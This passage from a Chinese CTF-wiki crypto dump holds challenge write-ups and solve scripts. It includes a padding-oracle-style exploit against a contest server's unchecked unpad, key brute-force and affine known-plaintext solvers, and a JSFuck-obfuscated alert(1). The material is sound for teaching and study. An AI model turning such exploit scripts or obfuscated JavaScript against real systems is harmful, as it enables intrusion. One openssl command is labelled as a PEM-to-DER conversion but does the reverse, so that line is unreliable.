self.pad(req.recv(1024).strip())\n                assert(len(msg) <= 256)\n                enc = self.encrypt(msg)\n                req.sendall('Here is the encrypted message: 0x%s\\n' % enc)\n            else:\n                req.sendall('Do not lose heart～ ！% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!')\n                req.close()\n                return\n\n\nclass ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):\n    pass\n\n\nif __name__ == \"__main__\":\n    HOST, PORT = '0.0.0.0', 23333\n    print 'Run in port:23333'\n    server = ThreadedServer((HOST, PORT), Task)\n    server.allow_reuse_address = True\n    server.serve_forever()\n\n```\n\n### 分析\n\n这个题目问题出在 padding 的时候，由于不足 256 位要进行 padding，padding 的字节也就是缺的字节数，但是如果明文够 256 字节，那么按照代码逻辑就不进行 padding： \n\n```python\ndef pad(self, s):\n        s += (256 - len(s)) * chr(256 - len(s))\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.s_box):\n            ret[pos] = s[index]\n        return ''.join(ret)\n```\n\n最大的问题出在 unpad 上，unpad 没有进行检查，仅仅通过最后一个字节来判断填充的字节数。 \n\n```python\n def unpad(self, s):\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.invs_box):\n            ret[pos] = s[index]\n        return ''.join(ret[0:-ord(ret[-1])])\n```\n\n我们可以通过篡改最后一个字节来控制去掉的 padding 字节数。\n\n### 利用\n\n1. 选择 choice2，追加 `256-33 =223`字节，使当前 flag 不需要填充，追加的最后一个字节设置成 `chr(256-32)`。\n\n2. 服务器对 flag 追加我们的信息，并进行 s 盒替换，结果赋给类中的 flag 变量。\n\n3. 我们再次选择 choice2，这里由于我们需要追加，服务器会将类中的 flag 变量取出进行逆 S 盒替换和 unpad，这样按照这个 unpad 算法会把后面 224 字节的全部当成 padding去掉，明文剩下了真正 flag 的前32位。\n\n4. 我们此时输入一个字符 i,那么此时加密的对象就是 `flag[:32]+i`。\n\n5. 选择 choice1 对当前 flag 加密，控制 i 进行爆破，如果得到的密文和最初的 flag 加密的密文一样，就得到了 flag 的最后一个字节。\n\n6. 逐字节爆破，直至获取全部的 flag。 \n\nexp 如下：\n\n```python\n# -*- coding: utf-8 -*-\nfrom hashlib import sha256\nimport socket\nimport string\nimport itertools\nHOST='106.75.13.64'\nPORT=54321\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\ndef brute_force(pad, shavalue):\n    for str in itertools.product(string.ascii_letters + string.digits, repeat=4):\n        str=''.join(str)\n        if sha256(str + pad).hexdigest() == shavalue:\n            print str\n            return str\ndef choice1():\n    sock.send(\"1\\n\")\n    result=sock.recv(1024).strip()[30:]\n    sock.recv(1024).strip()\n    return result\ndef choice2(pad):\n    sock.send(\"2\\n\")\n    sock.recv(1024).strip()\n    sock.send(pad+\"\\n\")\n    sock.recv(1024).strip()\n    sock.recv(1024).strip()\ndef choice3(str):\n    sock.send(\"3\\n\")\n    sock.recv(1024).strip()\n    sock.send(str+\"\\n\")\n    result=sock.recv(1024).strip()[33:]\n    sock.recv(1024).strip()\n    return result\ncontent = sock.recv(1024).strip()\npad=content[12:12+16]\nhash=content[33:33+64]\nsock.recv(1024).strip()\nsock.send(str(brute_force(pad,hash))+\"\\n\")\nprint sock.recv(1024).strip()\nflag_enc=choice1()\nflag=\"\"\nfor i in range(33):\n    a = ''.join(['a' for _ in range(223)])\n    a = a[:-1] + chr(224+i)\n    for c in string.printable:\n        print c+flag\n        choice2(a)\n        choice2(c+flag)\n        if choice1() == flag_enc:\n            flag=c+flag\n            print \"success:\",flag\n            break\n```\n\n> flag{H4ve_fun_w1th_p4d_and_unp4d} \n\n", "timestamp": "2025-10-21T22:02:52.360601"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/pcbc.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/pcbc.md", "content": "# PCBC\n\nPCBC 的全称为明文密码块链接（Plaintext cipher-block chaining）。也称为填充密码块链接（Propagating cipher-block chaining）。\n\n## 加密\n\n![](./figure/pcbc_encryption.png)\n\n## 解密\n\n![](./figure/pcbc_decryption.png)\n\n## 特点\n\n- 解密过程难以并行化\n- 互换邻接的密文块不会对后面的密文块造成影响", "timestamp": "2025-10-21T22:02:52.475430"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/simon-speck.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/simon-speck.md", "content": "# Simon and Speck Block Ciphers\n\n这是一组姐妹轻量级加密。\n\n## Simon Block Cipher\n\n### 基本介绍\n\nSimon 块加密算法由 NSA 2013 年 6 月公布，主要在**硬件实现**上进行了优化。\n\nSimon Block Cipher 是平衡的 [Feistel cipher](https://en.wikipedia.org/wiki/Feistel_cipher) 加密，一共有两块，若每块加密的大小为 n bits，那么明文的大小就是 2n bits。此外，一般来说，该加密中所使用的密钥长度是块长度的整数倍，比如 2n，4n等。常见的 Simon 加密算法有\n\n![](./figure/simon_cipher_mode.png)\n\n一般来说，Simon 算法称之为  Simon 2*n*/nm，n 为块大小，m 是块大小与密钥之间的倍数。比如说 Simon 48/96 就是指明文是 48 比特，密钥是 96 比特的加密算法。\n\n此外，对于 Simon 块加密算法来说，每轮的加密过程一样，如下\n\n![](./figure/Simon_block_cipher.png)\n\n当然，对于每一轮以及不同的 m 来说，密钥也会有所不同\n\n![](./figure/simon_key_schedule.svg)\n\n其中， $z_j$ 是由 Linear Feedback Shift Register (LFSR) 生成的，虽然对于不同的 $z_j$ 的逻辑不同，但是初始向量是固定的。\n\n|                 Constant                 |\n| :--------------------------------------: |\n| $z_{0}$=11111010001001010110000111001101111101000100101011000011100110 |\n| $z_{1}$=10001110111110010011000010110101000111011111001001100001011010 |\n| $z_{2}$=10101111011100000011010010011000101000010001111110010110110011 |\n| $z_{3}$=11011011101011000110010111100000010010001010011100110100001111 |\n| $z_{4}$=11010001111001101011011000100000010111000011001010010011101111 |\n\n### 2017 SECCON Simon and Speck Block Ciphers\n\n题目描述如下\n\n```\nSimon and Speck Block Ciphers\n\nhttps://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5\n```\n\n从名字中可以看出密钥是 96 比特（12 byte），明文是 64 比特（8字节），而密钥已经给出了 8 个字节，只剩下四个字节未知。那我们可以使用暴力破解的方法。这里从 https://github.com/bozhu/NSA-ciphers/blob/master/simon.py 获取了一份 simon 加密算法。\n\n具体如下\n\n```python\nfrom pwn import *\nfrom simon import SIMON\n\nplain = 0x6d564d37426e6e71\ncipher = 0xbb5d12ba422834b5\n\n\ndef compare(key):\n    key = \"SECCON{\" + key + \"}\"\n    key = key.encode('hex')\n    key = int(key, 16)\n    my_simon = SIMON(64, 96, key)\n    test = my_simon.encrypt(plain)\n    if test == cipher:\n        return True\n    else:\n        return False\n\n\ndef solve():\n    visible = string.uppercase + string.lowercase + string.digits + string.punctuation + \" \"\n    key = pwnlib.util.iters.mbruteforce(compare, visible, 4, method=\"fixed\")\n    print key\n\n\nif __name__ == \"__main__\":\n    solve()\n```\n\n结果如下\n\n```shell\n➜  2017_seccon_simon_and_speck_block_ciphers git:(master) python exp.py\n[+] MBruteforcing: Found key: \"6Pz0\"\n```\n\n\n\n## 参考文献\n\n- https://en.wikipedia.org/wiki/Simon_(cipher)\n", "timestamp": "2025-10-21T22:02:52.583559"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/certificate/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/certificate/introduction.md", "content": "# 证书格式\n\n\n## PEM\n\n\nPEM 以 `-----BEGIN` 开头，以 `-----END` 结尾，中间包含 ASN.1 格式的数据。ASN.1 是经过 base64 转码的二进制数据。[Wikipedia](https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail) 上有完整 PEM 文件的例子。\n\n\n用 Python 3 和 PyCryptodome 库可以与 PEM 文件交互并提取相关数据。例如我们想提取出模数 `n`：\n\n\n```py\n#!/usr/bin/env python3\nfrom Crypto.PublicKey import RSA\n\nwith open(\"certificate.pem\",\"r\") as f:\n\tkey = RSA.import_key(f.read())\n\tprint(key.n)\n```\n\n\n## DER\n\n\nDER 是 ASN.1 类型的二进制编码。后缀 `.cer` 或 `.crt` 的证书通常包含 DER 格式的数据，但 Windows 也可能会接受 PEM 格式的数据。\n\n\n我们可以用 `openssl` 将 PEM 文件转化为 DER 文件：\n\n\n```bash\nopenssl x509 -inform DER -in certificate.der > certificate.pem\n```\n\n\n现在问题被简化成了如何读取 PEM 文件，所以我们可以重复使用上一小节中的 Python 代码。\n\n\n## 其他格式转换\n\n\n```bash\nopenssl x509 -outform der -in certificate.pem -out certificate.der\nopenssl x509 -inform der -in certificate.cer -out certificate.pem\n```\n\n\n## 引用\n\n1. [Attacking RSA for fun and CTF points – part 1](https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/)\n2. [What are the differences between .pem, .cer and .der?](https://stackoverflow.com/questions/22743415/what-are-the-differences-between-pem-cer-and-der)\n\n", "timestamp": "2025-10-21T22:02:52.852419"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/classical/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/classical/introduction.md", "content": "# 古典密码简介\n\n在古典密码学中，我们主要介绍单表替代密码，多表替代密码，以及一些其它比较有意思的密码。\n\n值得一提的是，在古典密码学中，设计者主要考虑消息的保密性，使得只有相关密钥的人才可以解密密文获得消息的内容，对于消息的完整性和不可否认性则并没有进行太多的考虑。\n\n-   拓展阅读\n\n    -   [CTF 中那些脑洞大开的编码和加密](http://www.tuicool.com/articles/2E3INnm)\n    -   [古典密码学发展史](http://www.oscca.gov.cn/sca/zxfw/2017-04/24/content_1011709.shtml)\n    -   [古典密码——维基百科](https://zh.wikipedia.org/wiki/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A2%BC)\n\n", "timestamp": "2025-10-21T22:02:53.265510"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/classical/monoalphabetic.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/classical/monoalphabetic.md", "content": "# 单表代换加密\n\n## 通用特点\n\n在单表替换加密中，所有的加密方式几乎都有一个共性，那就是明密文一一对应。所以说，一般有以下两种方式来进行破解\n\n- 在密钥空间较小的情况下，采用暴力破解方式\n- 在密文长度足够长的时候，使用词频分析，http://quipqiup.com/\n\n当密钥空间足够大，而密文长度足够短的情况下，破解较为困难。\n\n## 凯撒密码\n\n### 原理\n\n凯撒密码（Caesar）加密时会将明文中的 **每个字母** 都按照其在字母表中的顺序向后（或向前）移动固定数目（**循环移动**）作为密文。例如，当偏移量是左移 3 的时候（解密时的密钥就是 3）：\n\n```\n明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ\n密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC\n```\n\n使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：\n\n```\n明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ\n```\n\n根据偏移量的不同，还存在**若干特定的恺撒密码名称**：\n\n- 偏移量为 10：Avocat （A→K）\n- 偏移量为 13：[ROT13](https://zh.wikipedia.org/wiki/ROT13)\n- 偏移量为 -5：Cassis （K 6）\n- 偏移量为 -6：Cassette （K 7）\n\n此外，还有还有一种基于密钥的凯撒密码 Keyed Caesar。其基本原理是 **利用一个密钥，将密钥的每一位转换为数字（一般转化为字母表对应顺序的数字），分别以这一数字为密钥加密明文的每一位字母。**\n\n这里以 **XMan 一期夏令营分享赛宫保鸡丁队 Crypto 100** 为例进行介绍。\n\n```\n密文：s0a6u3u1s0bv1a\n密钥：guangtou\n偏移：6,20,0,13,6,19,14,20\n明文：y0u6u3h1y0uj1u\n```\n\n### 破解\n\n对于不带密钥的凯撒密码来说，其基本的破解方法有两种方式\n\n1. 遍历 26 个偏移量，适用于普遍情况\n2. 利用词频分析，适用于密文较长的情况。\n\n其中，第一种方式肯定可以得到明文，而第二种方式则不一定可以得到正确的明文。\n\n而对于基于密钥的凯撒密码来说，一般来说必须知道对应的密钥。\n\n### 工具\n\n一般我们有如下的工具，其中JPK比较通用。\n\n- JPK，可解带密钥与不带密钥\n- http://planetcalc.com/1434/\n- http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php\n\n## 移位密码\n\n与凯撒密码类似，区别在于移位密码不仅会处理字母，还会处理数字和特殊字符，常用 ASCII 码表进行移位。其破解方法也是遍历所有的可能性来得到可能的结果。\n\n## Atbash Cipher\n\n### 原理\n\n埃特巴什码（Atbash Cipher）其实可以视为下面要介绍的简单替换密码的特例，它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。在罗马字母表中，它是这样出现的：\n\n```\n明文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A\n```\n\n下面给出一个例子：\n\n```\n明文：the quick brown fox jumps over the lazy dog\n密文：gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt\n```\n\n### 破解\n\n可以看出其密钥空间足够短，同时当密文足够长时，仍然可以采用词频分析的方法解决。\n\n### 工具\n\n- http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/\n\n## 简单替换密码\n\n### 原理\n\n简单替换密码（Simple Substitution Cipher）加密时，将每个明文字母替换为与之唯一对应且不同的字母。它与恺撒密码之间的区别是其密码字母表的字母不是简单的移位，而是完全是混乱的，这也使得其破解难度要高于凯撒密码。 比如：\n\n```\n明文字母 : abcdefghijklmnopqrstuvwxyz\n密钥字母 : phqgiumeaylnofdxjkrcvstzwb\n```\n\na 对应 p，d 对应 h，以此类推。\n\n```\n明文：the quick brown fox jumps over the lazy dog\n密文：cei jvaql hkdtf udz yvoxr dsik cei npbw gdm\n```\n\n而解密时，我们一般是知道了每一个字母的对应规则，才可以正常解密。\n\n### 破解\n\n由于这种加密方式导致其所有的密钥个数是$26!$ ，所以几乎上不可能使用暴力的解决方式。所以我们 一般采用词频分析。\n\n### 工具\n\n- http://quipqiup.com/\n\n## 仿射密码 \n\n### 原理\n\n仿射密码的加密函数是 $E(x)=(ax+b)\\pmod m$，其中\n\n- $x$ 表示明文按照某种编码得到的数字\n- $a$ 和 $m$ 互质\n- $m$ 是编码系统中字母的数目。\n\n解密函数是 $D(x)=a^{-1}(x-b)\\pmod m$，其中 $a^{-1}$ 是 $a$ 在 $\\mathbb{Z}_{m}$ 群的乘法逆元。\n\n下面我们以 $E(x) = (5x + 8) \\bmod 26$ 函数为例子进行介绍，加密字符串为 `AFFINE CIPHER`，这里我们直接采用字母表26个字母作为编码系统\n\n| 明文      | A   | F   | F   | I   | N   | E   | C   | I   | P   | H   | E   | R   |\n| --------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| x         | 0   | 5   | 5   | 8   | 13  | 4   | 2   | 8   | 15  | 7   | 4   | 17  |\n| $y=5x+8$  | 8   | 33  | 33  | 48  | 73  | 28  | 18  | 48  | 83  | 43  | 28  | 93  |\n| $y\\mod26$ | 8   | 7   | 7   | 22  | 21  | 2   | 18  | 22  | 5   | 17  | 2   | 15  |\n| 密文      | I   | H   | H   | W   | V   | C   | S   | W   | F   | R   | C   | P   |\n\n其对应的加密结果是 `IHHWVCSWFRCP`。\n\n对于解密过程，正常解密者具有a与b，可以计算得到 $a^{-1}$ 为 21，所以其解密函数是$D(x)=21(x-8)\\pmod {26}$ ，解密如下\n\n| 密文        | I    | H    | H   | W   | V   | C    | S   | W   | F   | R   | C    | P   |\n| ----------- | :--- | :--- | --- | --- | --- | ---- | --- | --- | --- | --- | ---- | --- |\n| $y$         | 8    | 7    | 7   | 22  | 21  | 2    | 18  | 22  | 5   | 17  | 2    | 15  |\n| $x=21(y-8)$ | 0    | -21  | -21 | 294 | 273 | -126 | 210 | 294 | -63 | 189 | -126 | 147 |\n| $x\\mod26$   | 0    | 5    | 5   | 8   | 13  | 4    | 2   | 8   | 15  | 7   | 4    | 17  |\n| 明文        | A    | F    | F   | I   | N   | E    | C   | I   | P   | H   | E    | R   |\n\n可以看出其特点在于只有 26 个英文字母。\n\n### 破解\n\n首先，我们可以看到的是，仿射密码对于任意两个不同的字母，其最后得到的密文必然不一样，所以其也具有最通用的特点。当密文长度足够长时，我们可以使用频率分析的方法来解决。\n\n其次，我们可以考虑如何攻击该密码。可以看出当$a=1$ 时，仿射加密是凯撒加密。而一般来说，我们利用仿射密码时，其字符集都用的是字母表，一般只有26个字母，而不大于26的与26互素的个数一共有 \n\n$$\n\\phi(26)=\\phi(2) \\times \\phi(13) = 12\n$$\n\n算上b的偏移可能，一共有可能的密钥空间大小也就是 \n\n$$\n12 \\times 26 = 312\n$$\n\n一般来说，对于该种密码，我们至少得是在已知部分明文的情况下才可以攻击。下面进行简单的分析。\n\n这种密码由两种参数来控制，如果我们知道其中任意一个参数，那我们便可以很容易地快速枚举另外一个参数得到答案。\n\n但是，假设我们已经知道采用的字母集，这里假设为26个字母，我们还有另外一种解密方式，我们只需要知道两个加密后的字母 $y_1,y_2$ 即可进行解密。那么我们还可以知道\n\n$$\ny_1=(ax_1+b)\\pmod{26} \\\\\ny_2=(ax_2+b)\\pmod{26}\n$$\n\n两式相减，可得\n\n$$\ny_1-y_2=a(x_1-x_2)\\pmod{26}\n$$\n\n这里 $y_1,y_2$ 已知，如果我们知道密文对应的两个不一样的字符 $x_1$ 与 $x_2$ ，那么我们就可以很容易得到 $a$ ，进而就可以得到 $b$ 了。\n\n### 例子\n\n这里我们以TWCTF 2016 的 super_express为例进行介绍。简单看一下给的源码\n\n```python\nimport sys\nkey = '****CENSORED***************'\nflag = 'TWCTF{*******CENSORED********}'\n\nif len(key) % 2 == 1:\n    print(\"Key Length Error\")\n    sys.exit(1)\n\nn = len(key) / 2\nencrypted = ''\nfor c in flag:\n    c = ord(c)\n    for a, b in zip(key[0:n], key[n:2*n]):\n        c = (ord(a) * c + ord(b)) % 251\n    encrypted += '%02x' % c\n\nprint encrypted\n```\n\n可以发现，虽然对于 flag 中的每个字母都加密了 n 次，如果我们仔细分析的话，我们可以发现\n\n$$\n\\begin{align*}\nc_1&=a_1c+b_1 \\\\\nc_2&=a_2c_1+b_2 \\\\\n   &=a_1a_2c+a_2b_1+b_2 \\\\\n   &=kc+d\n\\end{align*}  \n$$\n\n根据第二行的推导，我们可以得到其实 $c_n$ 也是这样的形式，可以看成 $c_n=xc+y$ ，并且，我们可以知道的是，key 是始终不变化的，所以说，其实这个就是仿射密码。\n\n此外，题目中还给出了密文以及部分部分密文对应的明文，那么我们就很容易利用已知明文攻击的方法来攻击了，利用代码如下\n\n```python\nimport gmpy\n\nkey = '****CENSORED****************'\nflag = 'TWCTF{*******CENSORED********}'\n\nf = open('encrypted', 'r')\ndata = f.read().strip('\\n')\nencrypted = [int(data[i:i + 2], 16) for i in range(0, len(data), 2)]\nplaindelta = ord(flag[1]) - ord(flag[0])\ncipherdalte = encrypted[1] - encrypted[0]\na = gmpy.invert(plaindelta, 251) * cipherdalte % 251\nb = (encrypted[0] - a * ord(flag[0])) % 251\na_inv = gmpy.invert(a, 251)\nresult = \"\"\nfor c in encrypted:\n    result += chr((c - b) * a_inv % 251)\nprint result\n```\n\n结果如下\n\n```shell\n➜  TWCTF2016-super_express git:(master) ✗ python exploit.py\nTWCTF{Faster_Than_Shinkansen!}\n```\n", "timestamp": "2025-10-21T22:02:53.395520"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/classical/others.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/classical/others.md", "content": "# 其它类型加密\n\n## 培根密码\n\n### 原理\n\n培根密码使用两种不同的字体，代表 A 和 B，结合加密表进行加解密。\n\n| a   | AAAAA | g   | AABBA | n   | ABBAA | t   | BAABA |\n| --- | ----- | --- | ----- | --- | ----- | --- | ----- |\n| b   | AAAAB | h   | AABBB | o   | ABBAB | u-v | BAABB |\n| c   | AAABA | i-j | ABAAA | p   | ABBBA | w   | BABAA |\n| d   | AAABB | k   | ABAAB | q   | ABBBB | x   | BABAB |\n| e   | AABAA | l   | ABABA | r   | BAAAA | y   | BABBA |\n| f   | AABAB | m   | ABABB | s   | BAAAB | z   | BABBB |\n\n上面的是常用的加密表。还有另外的一种加密表，可认为是将 26 个字母从 0 到 25 排序，以二进制表示，A 代表 0，B 代表 1。\n\n下面这一段内容就是明文 steganography 加密后的内容，正常字体是 A，粗体是 B：\n\n**T**o en**co**de **a** mes**s**age e**ac**h letter **of** the **pl**a**i**nt**ex**t **i**s replaced b**y a g**rou**p of f**i**ve** of **th**e lett**ers** **'A'** o**r 'B'**.\n\n可以看到，培根密码主要有以下特点\n\n- 只有两种字符\n- 每一段的长度为 5\n- 加密内容会有特殊的字体之分，亦或者大小写之分。\n\n### 工具\n\n- http://rumkin.com/tools/cipher/baconian.php\n\n## 栅栏密码\n\n### 原理\n\n栅栏密码把要加密的明文分成 N 个一组，然后把每组的第 1 个字连起来，形成一段无规律的话。这里给出一个例子\n\n```\n明文：THERE IS A CIPHER\n```\n\n去掉空格后变为\n\n```\nTHEREISACIPHER\n```\n\n分成两栏，两个一组得到\n\n```\nTH ER EI SA CI PH ER\n```\n\n先取出第一个字母，再取出第二个字母\n\n```\nTEESCPE\nHRIAIHR\n```\n\n连在一起就是\n\n```\nTEESCPEHRIAIHR\n```\n\n上述明文也可以分为2栏。\n\n```\nTHEREIS ACIPHER\n```\n\n组合得到密文\n\n```\nTAHCEIRPEHIESR\n```\n\n### 工具\n\n- https://www.qqxiuzi.cn/bianma/zhalanmima.php\n\n## 曲路密码\n\n### 原理\n\n曲路密码（Curve Cipher）是一种换位密码，需要事先双方约定密钥（也就是曲路路径）。下面给出一个例子\n\n```\n明文：The quick brown fox jumps over the lazy dog\n```\n\n填入 5 行 7 列表（事先约定填充的行列数）\n\n![qulu-table](./figure/qulu-table.png)\n\n加密的回路线（事先约定填充的行列数）\n\n![qulu-road](./figure/qulu-road.png)\n\n```\n密文：gesfc inpho dtmwu qoury zejre hbxva lookT\n```\n\n## 列移位加密\n\n### 原理\n\n列移位密码（Columnar Transposition Cipher）是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面给出一个例子。\n\n我们以明文 `The quick brown fox jumps over the lazy dog`，密钥 `how are u` 为例：\n\n将明文填入 5 行 7 列表（事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充）\n\n![明文](./figure/columnar-transposition-plaintext.png)\n\n密钥： `how are u`，按 `how are u` 在字母表中的出现的先后顺序进行编号，我们就有 a 为 1，e 为 2，h 为 3，o 为 4，r 为 5，u 为 6，w 为 7，所以先写出 a 列，其次 e 列，以此类推写出的结果便是密文：\n\n![密钥](./figure/columnar-transposition-key.png)\n\n密文： `qoury inpho Tkool hbxva uwmtd cfseg erjez`\n\n### 工具\n\n- http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ 行列数相等\n\n\n## 01248 密码\n\n### 原理\n\n该密码又称为云影密码，使用 0，1，2，4，8 四个数字，其中 0 用来表示间隔，其他数字以加法可以表示出 如：28=10，124=7，18=9，再用 1->26 表示 A->Z。\n\n可以看出该密码有以下特点\n\n- 只有 0，1，2，4，8\n\n### 例子\n\n这里我们以CFF 2016 影之密码为例进行介绍，题目\n\n> 8842101220480224404014224202480122\n\n我们按照0来进行分割，如下\n\n| 内容   | 数字           | 字符 |\n| ------ | -------------- | ---- |\n| 88421  | 8+8+4+2+1=23   | W    |\n| 122    | 1+2+2=5        | E    |\n| 48     | 4+8=12         | L    |\n| 2244   | 2+2+4+4=12     | L    |\n| 4      | 4              | D    |\n| 142242 | 1+4+2+2+4+2=15 | O    |\n| 248    | 2+4+8=14       | N    |\n| 122    | 1+2+2=5        | E    |\n\n所以最后的 flag 为 WELLDONE。\n\n## JSFuck\n\n### 原理\n\nJSFuck 可以只用 6 个字符 `[]()!+` 来编写 JavaScript 程序。比如我们想用 JSFuck 来实现 `alert(1)` 代码如下\n\n```javascript\n[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]((![]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()\n```\n\n其他一些基本的表达：\n\n```javascript\nfalse       =>  ![]\ntrue        =>  !![]\nundefined   =>  [][[]]\nNaN         =>  +[![]]\n0           =>  +[]\n1           =>  +!+[]\n2           =>  !+[]+!+[]\n10          =>  [+!+[]]+[+[]]\nArray       =>  []\nNumber      =>  +[]\nString      =>  []+[]\nBoolean     =>  ![]\nFunction    =>  [][\"filter\"]\neval        =>  [][\"filter\"][\"constructor\"]( CODE )()\nwindow      =>  [][\"filter\"][\"constructor\"](\"return this\")()\n```\n\n### 工具\n\n- [JSFuck 在线加密网站](http://www.jsfuck.com/)\n\n## BrainFuck\n\n### 原理\n\nBrainfuck，是一种极小化的计算机语言，它是由 Urban Müller 在 1993 年创建的。我们举一个例子，如果我们想要一个在屏幕上打印Hello World！，那么对应的程序如下。对于其中的原理，感兴趣的可以自行网上搜索。\n\n```\n++++++++++[>+++++++>++++++++++>+++>+<<<<-]\n>++.>+.+++++++..+++.>++.<<+++++++++++++++.\n>.+++.------.--------.>+.>.\n```\n\n与其对应的还有 ook。\n\n### 工具\n\n- https://www.splitbrain.org/services/ook\n\n## 猪圈密码\n\n### 原理\n\n猪圈密码是一种以格子为基础的简单替代式密码，格子如下\n\n![猪圈密码对照表](./figure/pigpen.png)\n\n我们举一个例子，如明文为 `X marks the spot` ，那么密文如下\n\n![猪圈密码示例](./figure/pigpen_example.png)\n\n### 工具\n\n- http://www.simonsingh.net/The_Black_Chamber/pigpen.html\n\n## 舞动的小人密码\n\n### 原理\n\n这种密码出自于福尔摩斯探案集。每一个跳舞的小人实际上对应的是英文二十六个字母中的一个，而小人手中的旗子则表明该字母是单词的最后一个字母，如果仅仅是一个单词而不是句子，或者是句子中最后的一个单词，则单词中最后一个字母不必举旗。\n\n![舞动的小人密码](./figure/dancingman.jpg)\n\n## 键盘密码\n\n所谓键盘密码，就是采用手机键盘或者电脑键盘进行加密。\n\n### 手机键盘密码\n\n手机键盘加密方式，是每个数字键上有 3-4 个字母，用两位数字来表示字母，例如：ru 